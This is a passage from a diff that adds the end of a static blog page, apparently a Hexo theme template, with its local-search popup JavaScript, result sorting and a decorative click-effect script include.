+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+
+</body>
+</html>
